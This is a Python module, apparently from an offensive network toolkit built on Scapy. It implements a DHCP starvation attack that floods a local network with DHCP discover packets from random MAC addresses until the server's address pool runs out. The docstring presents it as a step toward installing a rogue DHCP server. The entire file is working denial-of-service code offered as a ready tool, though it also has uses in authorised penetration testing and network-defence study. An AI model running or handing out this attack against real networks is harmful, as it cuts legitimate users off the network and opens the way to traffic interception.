from scapy.all import *
from util import Msg
from dos import DoS
from threading import Thread
from zoption import Zoption

"""DHCP starvation attack involves firing off DHCP request packets with random
   MAC addresses.  With this we can exhaust the address space reserved by the
   DHCP server.  This attack can be a viable stepping stone in the introduction
   of a rogue DHCP server.
   http://hakipedia.com/index.php/DHCP_Starvation
"""


class dhcp_starvation(DoS):
    def __init__(self):
        super(dhcp_starvation, self).__init__('DHCP Starvation')
        conf.verb = 0
        self.config.pop("target", None)
        self.config.update({"interval":Zoption(type = "int", 
                                               value = 0.1,
                                               required = False, 
                                display = "Interval to send advertisements")
                           })
        self.info = """
                    Cause a denial of service against a local DHCP server.
                    This will simply request IP addresses from randomized
                    MAC sources."""

    def initialize(self):
        Msg('Beginning DHCP starvation...')
        conf.checkIPaddr = False
        thread = Thread(target=self.starve)
        self.running = True
        thread.start()
        return True

    def starve(self):
        """ Starve the network of DHCP leases
        """
        while self.running:
            pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")
            pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
            pkt /= UDP(sport=68, dport=67)
            pkt /= BOOTP(chaddr=RandString(12, '0123456789abcdef'))
            pkt /= DHCP(options=[("message-type", 'discover'), 'end'])
            sendp(pkt)
            sleep(self.config['interval'].value)